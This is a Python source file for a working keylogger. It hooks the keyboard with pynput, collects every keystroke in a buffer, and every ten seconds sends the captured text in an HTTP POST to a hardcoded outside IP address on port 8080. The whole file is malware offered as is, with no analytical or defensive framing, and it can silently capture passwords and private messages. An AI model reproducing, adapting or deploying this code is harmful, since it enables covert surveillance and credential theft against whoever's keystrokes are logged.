from pynput import keyboard
import json
import requests
import threading

text = ""
lock = threading.Lock()
ip_address = "109.74.200.23"
port_number = "8080"
time_interval = 10  # Seconds between sends

special_keys = {
    keyboard.Key.enter: "\n",
    keyboard.Key.tab: "\t",
    keyboard.Key.space: " ",
    keyboard.Key.shift: "",
    keyboard.Key.shift_r: "",
    keyboard.Key.ctrl_l: "",
    keyboard.Key.ctrl_r: "",
    keyboard.Key.alt_l: "",
    keyboard.Key.alt_r: "",
    keyboard.Key.cmd: "",
    keyboard.Key.esc: "",  # Stopping handled separately
}

def send_post_request():
    global text
    data_to_send = ""
    try:
        # Capture and clear buffer atomically
        with lock:
            data_to_send = text
            text = ""

        if data_to_send:
            payload = json.dumps({"keyboardData": data_to_send})
            response = requests.post(
                f"http://{ip_address}:{port_number}",
                data=payload,
                headers={"Content-Type": "application/json"},
                timeout=15
            )
            response.raise_for_status()  # Raise exception for HTTP errors

    except requests.exceptions.RequestException as e:
        print(f"Network error: {e}")
        with lock:
            text = data_to_send + text
    except Exception as e:
        print(f"Unexpected error: {e}")
    finally:
        # Schedule next transmission
        timer = threading.Timer(time_interval, send_post_request)
        timer.daemon = True  # Allow program to exit
        timer.start()

def on_press(key):
    global text
    with lock:
        # Handle backspace properly
        if key == keyboard.Key.backspace:
            text = text[:-1] if text else ""
        # Handle special characters
        elif key in special_keys:
            text += special_keys[key]
        # Handle regular keys
        else:
            try:
                text += key.char
            except AttributeError:
                pass  # Ignore non-character keys

    # Stop listener on ESC
    return key != keyboard.Key.esc

# Main execution
with keyboard.Listener(on_press=on_press) as listener:
    send_post_request()  # Initial call starts the periodic sending
    listener.join()
